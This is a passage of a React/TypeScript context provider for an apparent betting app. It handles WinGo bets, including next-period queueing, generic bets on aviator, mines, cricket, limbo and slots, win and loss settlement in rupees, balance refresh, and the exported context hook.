            status: asAdmin ? 'in_progress' : ticket.status,
            updatedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
            messages: [...ticket.messages, newMsg],
          };
        }
        return ticket;
      })
    );
    toast('Message sent', 'info');
  };

  // Game betting
  const placeWingoBet = (amount: number, betOn: string, multiplier: number) => {
    if (!currentUser) return { success: false, error: 'Please log in to place bet' };
    const totalCost = Number((amount * multiplier).toFixed(2));
    if (currentUser.balance < totalCost) {
      return { success: false, error: `Insufficient balance! Needed ₹${totalCost.toFixed(2)}, Available ₹${currentUser.balance.toFixed(2)}` };
    }

    // All-time 24/7 betting: when time remaining is <= 3s (countdown/reveal), seamless queuing for the next period!
    const targetPeriod = wingoTimeRemaining <= 3
      ? (BigInt(currentWingoPeriod) + 1n).toString()
      : currentWingoPeriod;

    const deducted = deductUser(currentUser.id, totalCost, `WinGo Bet: ${betOn} (x${multiplier}) [Period #${targetPeriod.slice(-4)}]`);
    if (!deducted) return { success: false, error: 'Failed to place bet' };

    const bet: UserBet = {
      id: 'bet_' + Date.now() + Math.random().toString(36).substring(2, 6),
      userId: currentUser.id,
      game: 'wingo',
      amount: totalCost,
      betOn,
      multiplier,
      status: 'pending',
      period: targetPeriod,
      timestamp: new Date().toLocaleTimeString(),
    };

    setUserBets((prev) => [bet, ...prev]);

    if (wingoTimeRemaining <= 3) {
      toast(`⚡ Queued for next round #${targetPeriod.slice(-4)}: ₹${totalCost.toFixed(2)} on ${betOn}`, 'success');
    } else {
      toast(`Bet placed for Period #${targetPeriod.slice(-4)}: ₹${totalCost.toFixed(2)} on ${betOn}`, 'success');
    }
    return { success: true };
  };

  const placeGenericBet = (game: 'aviator' | 'mines' | 'cricket' | 'limbo' | 'slots', amount: number) => {
    if (!currentUser) return { success: false, error: 'Please log in first' };
    if (currentUser.balance < amount) {
      return {
        success: false,
        error: `Insufficient balance (₹${currentUser.balance.toFixed(2)})! Minimum recharge is ₹100. Please recharge your wallet to play.`,
      };
    }
    const deducted = deductUser(currentUser.id, amount, `${game.toUpperCase()} Bet: ₹${amount.toFixed(2)}`);
    if (!deducted) return { success: false, error: 'Deduction failed' };
    sounds.playChipBet();
    return { success: true };
  };

  const settleGenericWin = (game: 'aviator' | 'mines' | 'cricket' | 'limbo' | 'slots', amount: number, winAmount: number, multiplier: number) => {
    if (!currentUser) return;
    creditUser(currentUser.id, winAmount, `${game.toUpperCase()} Win (${multiplier.toFixed(2)}x)`);
    setLastGameResult({
      type: 'win',
      gameName: game.toUpperCase(),
      amount: winAmount,
      results: { multiplier },
    });
    sounds.playWin();
  };

  const settleGenericLoss = (game: 'aviator' | 'mines' | 'cricket' | 'limbo' | 'slots', amount: number, multiplier?: number) => {
    if (!currentUser) return;
    setLastGameResult({
      type: 'loss',
      gameName: game.toUpperCase(),
      amount,
      results: { multiplier },
    });
    sounds.playLoss();
  };

  const refreshUserBalance = () => {
    if (currentUser) {
      const refreshed = users.find((u) => u.id === currentUser.id);
      if (refreshed) {
        setCurrentUser({ ...refreshed });
        toast(`Balance updated: ₹${refreshed.balance.toFixed(2)}`, 'info');
      }
    }
  };

  return (
    <AppContext.Provider
      value={{
        currentUser,
        users,
        isAdmin,
        adminSettings,
        depositRequests,
        withdrawalRequests,
        transactions,
        supportTickets,
        wingoHistory,
        userBets,
        currentWingoPeriod,
        wingoTimeRemaining,
        login,
        register,
        logout,
        adminLogin,
        adminLogout,
        claimDailyLoginBonus,
        submitDeposit,
        submitWithdrawal,
        approveDeposit,
        rejectDeposit,
        approveWithdrawal,
        rejectWithdrawal,
        updateAdminSettings,
        createSupportTicket,
        replyToTicket,
        placeWingoBet,
        placeGenericBet,
        settleGenericWin,
        settleGenericLoss,
        lastGameResult,
        setLastGameResult,
        soundMuted,
        toggleSound,
        refreshUserBalance,
        toast,
        currentToast,
      }}
    >
      {children}
    </AppContext.Provider>
  );
};

export const useApp = () => {
  const context = useContext(AppContext);
  if (!context) {
    throw new Error('useApp must be used within an AppProvider');
  }
  return context;
};
